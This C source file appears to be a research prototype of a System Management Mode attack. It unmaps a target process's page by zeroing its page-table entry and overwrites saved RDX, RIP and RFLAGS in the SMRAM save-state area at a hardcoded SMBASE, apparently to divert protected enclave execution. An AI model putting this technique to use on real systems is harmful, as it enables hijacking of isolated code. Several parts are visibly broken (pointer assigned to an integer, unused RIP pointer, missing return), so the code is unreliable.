#include "smi3.h"


unsigned long *handler0_remap(unsigned long vadd){
    unsigned long cr = 0xffff963b245f8000;
    unsigned long paddr=0;
    unsigned long page_addr=0;
    unsigned long P_OFFSET=0;
    unsigned long *pgd, *pud, *pmd, *pte;
    unsigned long *pte_c;
    unsigned long pte_mask;
    
//    printk("vaddr = 0x%lx,  cr3 = 0x%lx  \n", vaddr, cr3);

    pgd = (unsigned long *)(cr - PAGE_OFFSET1);
    pgd = pgd + ((vadd>>39) & 0x1FF);

    pud = (unsigned long *)((unsigned long)*pgd & PTE_PFN_MASK1);
    pud = pud + ((vadd>>30) & 0x1FF);


    pmd = (unsigned long *)((unsigned long)*pud & PTE_PFN_MASK1) ;
    pmd = pmd + ((vadd>>21) & 0x1FF);
 
    pte = (unsigned long *)((unsigned long)*pmd & PTE_PFN_MASK1);
    pte = pte + ((vadd>>12) & 0x1FF);


    pte_c = pte;
    return pte;
}


int sera_launch_smi(void){
     //Here we need random choosing, and we write one for example.  
     unsigned long phy_addr = 0x15581200; //new physical address pte
     unsigned long vir_addr = 0x55acec0c14bb;
      
      unsigned long *pte;
      pte = (unsigned long *)handler0_remap(vir_addr);    //store and unmapping the pte;
      ori_map_pte = *pte;
      *pte = 0; 


     unsigned long e_vaddr = 0x7ffeb0bd0410^0xaddfffdfdfdfd;
    
     unsigned long smbase = 0xb83CE000; //the fixed address in current motherboard

     unsigned long greg_addr = smbase + 0x7fD8; //get the rdx from ssa
     unsigned long *p0= (unsigned long *)greg_addr;
     *p0 = e_vaddr;

    
     //config the address jump to aep;
     unsigned long rip_addr = smbase + 0x7ff0; //get the rip from ssa
     unsigned long *p1= (unsigned long *)rip_addr;

    unsigned long rflags;
    //clear_ifg(); // execute in host

    //work in smm  // execute in SMI handler
    unsigned long rflags_addr = smbase +0x7ff4;   //get the rglags from ssa
    unsigned long *p= (unsigned long *)rflags_addr;
    rflags = (unsigned long *)rflags_addr;
    rflags = rflags & 0x3FFDFF; //clear bit 9 to 0
    *p = rflags;
    
    return 0;
}

int sera_monitor_smi(void){
     //Here we need random choosing, and we write one for example.  
     unsigned long phy_addr = 0x15581200; //new physical address pte
     unsigned long vir_addr = 0x55acec0c14bb;

     unsigned long *pte;
     pte = (unsigned long *)handler0_remap(vir_addr);    //remapingmapping the pte;
     *pte = ori_map_pte; 
}



int loop_time(void){
	
	long i,j;
	int a=0;
	for(i=0;i<1000000000;i++){
	 for(j=0;j<1000000000;j++)
	 {
		if(j%2 == 0)
		   a=1;
		else 
		   a=0;
         }
	}
   return a;
}

